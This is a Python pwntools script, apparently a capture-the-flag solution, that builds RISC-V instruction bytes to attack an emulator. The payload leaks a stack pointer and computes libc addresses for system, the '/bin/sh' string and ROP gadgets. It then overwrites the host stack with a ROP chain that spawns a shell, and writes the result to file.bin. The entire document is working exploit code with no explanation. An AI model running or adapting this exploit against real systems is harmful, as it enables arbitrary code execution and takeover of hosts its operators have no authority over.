from pwn import *

# opcodes
I_TYPE = 0x13
S_TYPE = 0x23
R_TYPE = 0x33
LOAD = 0x3

# instructions
ADDSUB = ADD = 0x0
SLLI = 0x1 
SD = 0x3


# Registers 
A0 = 10
A1 = 11
A2 = 12
A3 = 13
A4 = 14
A5 = 15
A6 = 16
A7 = 17
S2 = 18
S3 = 19
S4 = 20
SP = 0x2


def init(opcode, funct3=0, funct7=0, rd=0, rs1=0, rs2=0):
        inst = 0
        inst |= (opcode & 0x7f)
        inst |= (funct3 & 0x7) << 12
        inst |= (funct7 & 0x7f) << 25
        inst |= (rs1 & 0x1f) << 15
        inst |= (rs2 & 0x1f) << 20
        inst |= (rd & 0x1f) << 7

        return inst


def exec_ADDI(opcode=I_TYPE, funct3=ADD, funct7=0, rd=0, rs1=0, rs2=0, imm=0):
        inst = init(opcode, funct3, funct7, rd, rs1, rs2)
        inst |= (imm & 0xfff) << 20
        return inst


def exec_SLLI(opcode=I_TYPE, funct3=SLLI, funct7=0, rs1=0, rs2=0, rd=0, imm=0):
        ins = init(opcode, funct3, funct7, rd, rs1, rs2)
        ins |= ((imm & 0xfff) << 20)

        return ins


def exec_LD(opcode=LOAD, funct3=0x3, funct7=0x0, rs1=0, rs2=0, rd=0x0, imm=0x0):
        ins = init(opcode, funct3, funct7, rd, rs1, rs2)
        ins |= (imm & 0xfff) << 20

        return ins


def exec_ADD(opcode=R_TYPE, funct3=ADDSUB, funct7=ADD, rs1=0, rs2=0, rd=0, imm=0):
        ins = init(opcode, funct3, funct7, rd, rs1, rs2)
        return ins


def exec_SD(opcode=S_TYPE, funct3=SD, funct7=0, rs1=0, rs2=0, rd=0, imm=0):
        ins = init(opcode, funct3, funct7, rd, rs1, rs2)
        ins |= ((imm & 0xfe0) << 20 | (imm & 0x1f) << 7)

        return ins


def main():
        payload = flat([
        # Load from the array into a register
        exec_LD(rd=A0, rs1=0x2, imm=0x18), # Leak Address into A0
        exec_ADDI(rd=A0, rs1=A0, imm=0x36),
        exec_ADDI(rd=A1, rs1=A0, imm=-0xc0),
        ])

        for _ in range(625): payload += flat(exec_ADDI(rd=A1, rs1=A1, imm=-0x100))

        # A1 - libc_base address

        payload += flat([
        exec_ADDI(rd=A2, rs1=A2, imm=0x4c3),
        exec_SLLI(rd=A2, rs1=A2, imm=0x8),
        exec_ADDI(rd=A2, rs1=A2, imm=0x30),

        exec_ADD(rd=A3, rs1=A2, rs2=A1),


        exec_ADDI(rd=A4, rs1=A4, imm=0x196),
        exec_SLLI(rd=A4, rs1=A4, imm=0xc),
        exec_ADDI(rd=A4, rs1=A4, imm=0x031),

        exec_ADDI(rd=A5, rs1=A5, imm=0x277),
        exec_SLLI(rd=A5, rs1=A5, imm=0x8),
        exec_ADDI(rd=A5, rs1=A5, imm=0x25),

        exec_ADDI(rd=A6, rs1=A6, imm=0x270),
        exec_SLLI(rd=A6, rs1=A6, imm=0x8),
        exec_ADDI(rd=A6, rs1=A6, imm=0xc2),

        exec_ADD(rd=S2, rs1=A1, rs2=A4), # binsh
        exec_ADD(rd=S3, rs1=A1, rs2=A5), # pop_rdi
        exec_ADD(rd=S4, rs1=A1, rs2=A6), # ret
       

        # Overwrite values on the stack 
        exec_SD(rs1=SP, rs2=S3, imm=24), # pop_rdi 
        exec_SD(rs1=SP, rs2=S2, imm=32), # &binsh
        exec_SD(rs1=SP, rs2=S4, imm=40), # ret
        exec_SD(rs1=SP, rs2=A3, imm=48), # &system
        
        ])

        with open("file.bin", "wb") as fp: fp.write(payload)

if __name__ == "__main__":
        main()
